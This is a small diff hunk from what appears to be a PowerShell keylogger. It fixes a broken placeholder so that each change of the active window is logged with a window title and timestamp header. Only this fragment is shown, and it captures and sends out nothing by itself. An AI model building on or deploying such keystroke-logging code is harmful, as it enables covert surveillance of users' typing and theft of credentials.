@@ -160,7 +160,7 @@ while ($true) {
 			if ($unicode_res -gt 0) {
 				if ($WindowTitle -ne $LastWindowTitle){
 					# if the window has changed
-					$TimeStamp = (--)
+					$TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
 					$Outout = "`n[$WindowTitle - $TimeStamp]`n"
 					$LastWindowTitle = $WindowTitle
 				}
